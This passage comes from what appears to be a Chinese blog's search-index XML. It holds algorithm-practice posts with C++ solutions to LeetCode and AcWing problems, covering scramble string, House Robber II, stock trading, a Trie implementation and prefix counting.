class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">removeDuplicates</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.<span class="hljs-built_in">size</span>(); i++)<br>            <span class="hljs-keyword">if</span>(!i || nums[i] != nums[i<span class="hljs-number">-1</span>])<br>                nums[k++]=nums[i];<br>        <span class="hljs-keyword">return</span> k;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】LeetCode 87.扰乱字符串</title>
      <link href="/2021/04/c4df32de.html"/>
      <url>/2021/04/c4df32de.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode-87-扰乱字符串"><a href="#LeetCode-87-扰乱字符串" class="headerlink" title="LeetCode 87.扰乱字符串"></a><a href="https://leetcode-cn.com/problems/scramble-string/">LeetCode 87.扰乱字符串</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这道题目前没有思路…先贴一道标程等什么时候理解了再补，如果有会推DP的大佬欢迎指点小海豚- -</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isScramble</span><span class="hljs-params">(string s1, string s2)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = s1.<span class="hljs-built_in">size</span>();<br>        vector&lt;vector&lt;vector&lt;<span class="hljs-type">bool</span>&gt;&gt;&gt; <span class="hljs-built_in">f</span>(n, vector&lt;vector&lt;<span class="hljs-type">bool</span>&gt;&gt;(n, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt;(n+<span class="hljs-number">1</span>)));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">1</span>;k&lt;=n;k++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i+k<span class="hljs-number">-1</span>&lt;n;i++)<br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j+k<span class="hljs-number">-1</span>&lt;n;j++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(k==<span class="hljs-number">1</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">if</span>(s1[i]==s2[j])    f[i][j][k]=<span class="hljs-literal">true</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> u=<span class="hljs-number">1</span>;u&lt;k;u++)<br>                        &#123;<br>                            <span class="hljs-keyword">if</span>(f[i][j][u] &amp;&amp; f[i+u][j+u][k-u] || f[i][j+k-u][u] &amp;&amp; f[i+u][j][k-u])<br>                            &#123;<br>                                f[i][j][k]=<span class="hljs-literal">true</span>;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> f[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][n];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing-94-递归实现排列型枚举"><a href="#AcWing-94-递归实现排列型枚举" class="headerlink" title="AcWing 94.递归实现排列型枚举"></a><a href="https://www.acwing.com/problem/content/96/">AcWing 94.递归实现排列型枚举</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>本题要求是按照字典序给出全排列顺序，因此需要逐个字符的递归式判断，所以可以判定此题就是用DFS求解即可，当每次递归到边界时候说明一个方法已经走完了，这时候就可以结束当前递归，依次输出数字，然后继续下一个（注意状态恢复）即可，最终的边界部位直接退出程序即可</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">10</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> nums[N];<br><span class="hljs-type">bool</span> st[N];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(u&gt;n)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>            cout&lt;&lt;nums[i]&lt;&lt;<span class="hljs-string">&#x27; &#x27;</span>;<br>        cout&lt;&lt;endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!st[i])<br>        &#123;<br>            nums[u]=i;<br>            st[i]=<span class="hljs-literal">true</span>;<br>            <span class="hljs-built_in">dfs</span>(u+<span class="hljs-number">1</span>);<br>            st[i]=<span class="hljs-literal">false</span>;<br>            nums[u]=<span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】LeetCode 213.打家劫舍II - 线性DP</title>
      <link href="/2021/04/cdd03afb.html"/>
      <url>/2021/04/cdd03afb.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode-213-打家劫舍II"><a href="#LeetCode-213-打家劫舍II" class="headerlink" title="LeetCode 213.打家劫舍II"></a><a href="https://leetcode-cn.com/problems/house-robber-ii/">LeetCode 213.打家劫舍II</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这道题有一道前置题目，即<a href="https://leetcode.com/problems/house-robber/description/">LeetCode 198.打家劫舍</a>，这道前置题目没有环形，是一道常规的线性DP，在每一步都分别判定选和不选的状态即可，而到了本题内，因为是环形的，那么在起始点（终点）的地方就要注意一下，这里起点终点相互影响，所以我们要用分支结构控制一下每个分支的计算的房子，防止少判断</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n=nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span>(n==<span class="hljs-number">0</span>)   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>)    <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(n==<span class="hljs-number">2</span>)    <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(nums[<span class="hljs-number">0</span>], nums[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>, f, g;<br>        f=nums[<span class="hljs-number">2</span>]; g=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">3</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> lastf=f,lastg=g;<br>            f=lastg+nums[i];<br>            g=<span class="hljs-built_in">max</span>(lastf, lastg);<br>        &#125;<br>        ans=g+nums[<span class="hljs-number">0</span>];<br><br>        f=nums[<span class="hljs-number">1</span>];  g=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>; i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> lastf=f, lastg=g;<br>            f=lastg+nums[i];<br>            g=<span class="hljs-built_in">max</span>(lastf, lastg);<br>        &#125;    <br>        ans=<span class="hljs-built_in">max</span>(ans, <span class="hljs-built_in">max</span>(f,g));<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1055-股票买卖"><a href="#AcWing-1055-股票买卖" class="headerlink" title="AcWing 1055.股票买卖"></a><a href="https://www.acwing.com/problem/content/1057/">AcWing 1055.股票买卖</a></h2><h4 id="思路I"><a href="#思路I" class="headerlink" title="思路I"></a>思路I</h4><p>这道题在蓝桥杯选拔校赛中出现过，贪心的思路也很简单，判断每天比前一天是涨还是跌就好了，如果明天股票会跌那么今天全部卖掉，如果明天股票涨那么就要大量买入，得到的结果一定是最优的。</p><h4 id="C-代码I"><a href="#C-代码I" class="headerlink" title="C++代码I"></a>C++代码I</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> INF=<span class="hljs-number">0x3f3f3f</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> a[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        cin&gt;&gt;a[i];<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        <span class="hljs-keyword">if</span>(a[i]-a[i<span class="hljs-number">-1</span>]&gt;<span class="hljs-number">0</span>)   res+=a[i]-a[i<span class="hljs-number">-1</span>];<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="思路II"><a href="#思路II" class="headerlink" title="思路II"></a>思路II</h4><p>这道题正解应该使用DP来实现的，分析下来一共有两个状态要推：</p><ol><li>当前处于<code>未持股状态</code>：<br>对应的转换有买入和不买入两种处理</li><li>当前处于<code>持股状态</code>：<br>对应的转换状态就有卖出和不卖出<br>由此就可以推出状态转移方程。</li></ol><h4 id="C-代码II"><a href="#C-代码II" class="headerlink" title="C++代码II"></a>C++代码II</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span> + <span class="hljs-number">10</span>, INF = <span class="hljs-number">0x3f3f3f</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> w[N];<br><span class="hljs-type">int</span> f[N][<span class="hljs-number">2</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i) <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;w[i]);<br><br>    f[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = -INF;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i) &#123;<br>        f[i][<span class="hljs-number">0</span>] = <span class="hljs-built_in">max</span>(f[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>], f[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>] + w[i]);<br>        f[i][<span class="hljs-number">1</span>] = <span class="hljs-built_in">max</span>(f[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>], f[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] - w[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, f[n][<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】面试高频考点 - LeetCode 208.实现Trie(前缀树)</title>
      <link href="/2021/04/2c08cb6b.html"/>
      <url>/2021/04/2c08cb6b.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode-208-实现Trie-前缀树"><a href="#LeetCode-208-实现Trie-前缀树" class="headerlink" title="LeetCode 208. 实现Trie(前缀树)"></a><a href="https://leetcode-cn.com/problems/implement-trie-prefix-tree/">LeetCode 208. 实现Trie(前缀树)</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这是一道Trie树的标程题，按照Trie树的构建标准写即可，引用Wiki的一段</p><blockquote><p>在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6">计算机科学</a>中，<strong>trie</strong>，又称<strong>前缀树</strong>或<strong>字典树</strong>，是一种有序<a href="https://zh.wikipedia.org/wiki/%E6%A0%91_(%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84)">树</a>，用于保存<a href="https://zh.wikipedia.org/wiki/%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84">关联数组</a>，其中的键通常是<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>。与<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91">二叉查找树</a>不同，键不是直接保存在节点中，而是由节点在树中的位置决定。一个节点的所有子孙都有相同的<a href="https://zh.wikipedia.org/wiki/%E5%89%8D%E7%BC%80">前缀</a>，也就是这个节点对应的字符串，而根节点对应<a href="https://zh.wikipedia.org/wiki/%E7%A9%BA%E5%AD%97%E7%AC%A6%E4%B8%B2">空字符串</a>。一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。</p><p>Trie这个术语来自于re<strong>trie</strong>val。根据<a href="https://zh.wikipedia.org/wiki/%E8%AF%8D%E6%BA%90%E5%AD%A6">词源学</a>，trie的发明者Edward Fredkin把它读作<a href="https://zh.wikipedia.org/wiki/Help:%E8%8B%B1%E8%AA%9E%E5%9C%8B%E9%9A%9B%E9%9F%B3%E6%A8%99">&#x2F;ˈtriː&#x2F;</a> “tree”。[<a href="https://zh.wikipedia.org/wiki/Trie#cite_note-DADS-1">1]</a>[<a href="https://zh.wikipedia.org/wiki/Trie#cite_note-Liang1983-2">2]</a>但是，其他作者把它读作<a href="https://zh.wikipedia.org/wiki/Help:%E8%8B%B1%E8%AA%9E%E5%9C%8B%E9%9A%9B%E9%9F%B3%E6%A8%99">&#x2F;ˈtraɪ&#x2F;</a> “try”。[<a href="https://zh.wikipedia.org/wiki/Trie#cite_note-DADS-1">1]</a>[<a href="https://zh.wikipedia.org/wiki/Trie#cite_note-Liang1983-2">2]</a>[<a href="https://zh.wikipedia.org/wiki/Trie#cite_note-KnuthVol3-3">3]</a></p><p>在图示中，键标注在节点中，值标注在节点之下。每一个完整的英文单词对应一个特定的整数。Trie可以看作是一个<a href="https://zh.wikipedia.org/wiki/%E7%A1%AE%E5%AE%9A%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E8%87%AA%E5%8A%A8%E6%9C%BA">确定有限状态自动机</a>，尽管边上的符号一般是隐含在分支的顺序中的。</p><p>键不需要被显式地保存在节点中。图示中标注出完整的单词，只是为了演示trie的原理。</p><p>trie中的键通常是字符串，但也可以是其它的结构。trie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。比如，<strong>bitwise trie</strong>中的键是一串比特，可以用于表示整数或者内存地址。</p></blockquote><h5 id="Trie树的应用"><a href="#Trie树的应用" class="headerlink" title="Trie树的应用"></a>Trie树的应用</h5><p>trie树常用于搜索提示。如当输入一个网址，可以自动搜索出可能的选择。当没有完全匹配的搜索结果，可以返回前缀最相似的可能。[<a href="https://zh.wikipedia.org/wiki/Trie#cite_note-4">4]</a></p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Trie</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> son[<span class="hljs-number">100010</span>][<span class="hljs-number">26</span>], ok[<span class="hljs-number">100010</span>];<br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-comment">/** Initialize your data structure here. */</span><br>    <span class="hljs-built_in">Trie</span>() &#123;<br>        <span class="hljs-built_in">memset</span>(son, <span class="hljs-number">0</span> ,<span class="hljs-built_in">sizeof</span>(son));<br>        <span class="hljs-built_in">memset</span>(ok,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(ok));<br>    &#125;<br>    <br>    <span class="hljs-comment">/** Inserts a word into the trie. */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(string word)</span> </span>&#123;<br>        <span class="hljs-type">int</span> p=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> c:word)<br>        &#123;<br>            <span class="hljs-type">int</span> u=c-<span class="hljs-string">&#x27;a&#x27;</span>;<br>            <span class="hljs-keyword">if</span>(!son[p][u])  son[p][u]=++idx;<br>            p=son[p][u];<br>        &#125;<br>        ok[p]=<span class="hljs-number">1</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">/** Returns if the word is in the trie. */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">search</span><span class="hljs-params">(string word)</span> </span>&#123;<br>        <span class="hljs-type">int</span> p=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> c:word)<br>        &#123;<br>            <span class="hljs-type">int</span> u=c-<span class="hljs-string">&#x27;a&#x27;</span>;<br>            <span class="hljs-keyword">if</span>(!son[p][u])  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            p=son[p][u];<br>        &#125;<br>        <span class="hljs-keyword">return</span> ok[p];<br>    &#125;<br>    <br>    <span class="hljs-comment">/** Returns if there is any word in the trie that starts with the given prefix. */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">startsWith</span><span class="hljs-params">(string prefix)</span> </span>&#123;<br>        <span class="hljs-type">int</span> p=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> c:prefix)<br>        &#123;<br>            <span class="hljs-type">int</span> u=c-<span class="hljs-string">&#x27;a&#x27;</span>;<br>            <span class="hljs-keyword">if</span>(!son[p][u])  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            p=son[p][u];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your Trie object will be instantiated and called as such:</span><br><span class="hljs-comment"> * Trie* obj = new Trie();</span><br><span class="hljs-comment"> * obj-&gt;insert(word);</span><br><span class="hljs-comment"> * bool param_2 = obj-&gt;search(word);</span><br><span class="hljs-comment"> * bool param_3 = obj-&gt;startsWith(prefix);</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h2 id="AcWing-142-前缀统计"><a href="#AcWing-142-前缀统计" class="headerlink" title="AcWing 142.前缀统计"></a><a href="https://www.acwing.com/problem/content/144/">AcWing 142.前缀统计</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>Trie树的变种应用</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1000010</span>;<br><br><span class="hljs-type">int</span> n,m;<br><span class="hljs-type">int</span> son[N][<span class="hljs-number">26</span>], cnt[N], idx;<br><span class="hljs-type">char</span> str[N];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> p=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;str[i];i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u=str[i]-<span class="hljs-string">&#x27;a&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(!son[p][u])  son[p][u]=++idx;<br>        p=son[p][u];<br>    &#125;<br>    cnt[p]++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> p=<span class="hljs-number">0</span>, res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;str[i];i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u=str[i]-<span class="hljs-string">&#x27;a&#x27;</span>;<br>        <span 